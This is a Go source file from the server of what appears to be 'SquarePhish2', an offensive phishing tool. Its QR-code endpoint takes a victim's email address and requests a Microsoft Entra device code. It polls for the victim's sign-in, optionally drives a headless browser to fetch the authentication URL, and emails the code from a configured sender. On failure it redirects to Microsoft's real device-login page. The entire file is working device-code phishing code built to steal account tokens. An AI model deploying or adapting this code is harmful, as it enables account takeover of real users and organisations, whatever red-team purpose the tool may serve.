package server

import (
	"net/http"
	"net/mail"
	"strings"
	"time"

	"github.com/gorilla/mux"
	"github.com/nromsdahl/squarephish2/internal/config"
	"github.com/nromsdahl/squarephish2/internal/database"
	_email "github.com/nromsdahl/squarephish2/internal/email"
	log "github.com/sirupsen/logrus"
)

// handler creates an HTTP handler function for the SquarePhish server.
// Parameters:
//   - w: The ResponseWriter
//   - r: The Request
//
// It uses HTTP Status Found (302) for redirection.
func handler(w http.ResponseWriter, r *http.Request) {
	params := r.URL.Query()
	email := params.Get("email")
	auto := params.Get("auto")
	domain := params.Get("domain")

	if email == "" {
		log.Print("[---] No email address found in request")
		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
		return
	}

	_, err := mail.ParseAddress(email)
	if err != nil {
		log.Printf("[---] Invalid email address provided: %s", err)
		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
		return
	}

	// Insert the email address into the emails_scanned table
	// Not critical if this fails
	log.Printf("[%s] Link triggered\n", email)
	_ = database.SaveEmailScanned(email)

	// --- 1. Request device code ---

	// Load the current configuration
	config := database.LoadConfig()

	// Get the Entra config
	entraConfig := config.EntraConfig
	requestConfig := config.RequestConfig

	deviceCodeResult, err := initDeviceCode(email, entraConfig, requestConfig)
	if err != nil {
		log.Printf("[%s] Error initializing device code: %s", email, err)
		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
		return
	}

	// --- 2. Start polling for device code authentication ---

	go authPoll(email, deviceCodeResult, entraConfig, requestConfig)

	// --- 3a. Attempt to retrieve the authentication URL ---

	// Via: @denniskniep
	//      https://github.com/denniskniep/DeviceCodePhishing

	// Attempt to retrieve the authentication URL using the headless browser, if failure
	// or if 'auto' is not true, send the email with the device code.
	if auto == "true" {
		// If we made it this far, assume we want to continue regardles, so even if the 
		// domain is missing or fails, we should still continue.
		if domain == "" {
			log.Printf("[%s] No tenant domain provided", email)
		} else {
			tenantInfo, err := GetTenantInfo(domain)
			if err != nil {
				log.Printf("[%s] Error getting tenant info: %s", email, err)
			} else {
				authURL, err := EnterDeviceCodeWithHeadlessBrowser(deviceCodeResult, requestConfig, tenantInfo)
				if err == nil {
					log.Printf("[%s] Successfully retrieved authentication URL: %s", email, authURL)
					http.Redirect(w, r, authURL, http.StatusFound)
					return
				}
				log.Printf("[%s] Failed to retrieve authentication URL, falling back to device code email: %s", email, err)
			}
		}
	}

	// --- 3b. Prepare user device code email ---

	emailConfig := config.EmailConfig
	smtpConfig := config.SMTPConfig

	// Check if the SMTP config is valid
	if smtpConfig.Host == "" || smtpConfig.Port == "" || smtpConfig.Username == "" || smtpConfig.Password == "" {
		log.Printf("[%s] SMTP config is invalid", email)
		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
		return
	}

	// Check if the email config is valid
	if emailConfig.Sender == "" || emailConfig.Subject == "" || emailConfig.Body == "" {
		log.Printf("[%s] Email config is invalid", email)
		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
		return
	}

	sender := emailConfig.Sender
	recipients := []string{email}
	subject := emailConfig.Subject
	bodyFmt := emailConfig.Body
	body := strings.Replace(bodyFmt, "{DEVICE_CODE}", deviceCodeResult.UserCode, 1)

	// --- 4. Send user device code email ---

	err = _email.SendEmail(smtpConfig, sender, recipients, subject, body)
	if err != nil {
		log.Printf("[%s] Error sending email: %s", email, err)
		http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
		return
	}

	log.Printf("[%s] Email sent", email)
	http.Redirect(w, r, "https://microsoft.com/devicelogin", http.StatusFound)
}

// StartHTTPSServer starts the SquarePhish server.
// Parameters:
//   - config: The server configuration.
//
// It returns nothing.
func StartHTTPSServer(config *config.PhishServer) {
	var err error

	// Use a custom endpoint qr code scans
	r := mux.NewRouter()
	r.HandleFunc("/CkyAAx7xES", handler).Methods("GET")

	// Create a new HTTP/S server with timeouts
	srv := &http.Server{
		Addr:               config.ListenURL,
		ReadTimeout:        5 * time.Second,
		ReadHeaderTimeout:  2 * time.Second,
		WriteTimeout:      10 * time.Second,
		IdleTimeout:       30 * time.Second,
		Handler:            r,
	}

	if config.UseTLS {
		err = srv.ListenAndServeTLS(config.CertPath, config.KeyPath)
	} else {
		err = srv.ListenAndServe()
	}

	if err != nil {
		log.Fatalf("FATAL: failed to start SquarePhish server:\n%v", err)
	}

	// This part is typically only reached if the server shuts down gracefully,
	// which ListenAndServeTLS doesn't really support directly without custom logic.
	// So, in practice, this function mainly returns errors or runs forever.
	// return nil
}
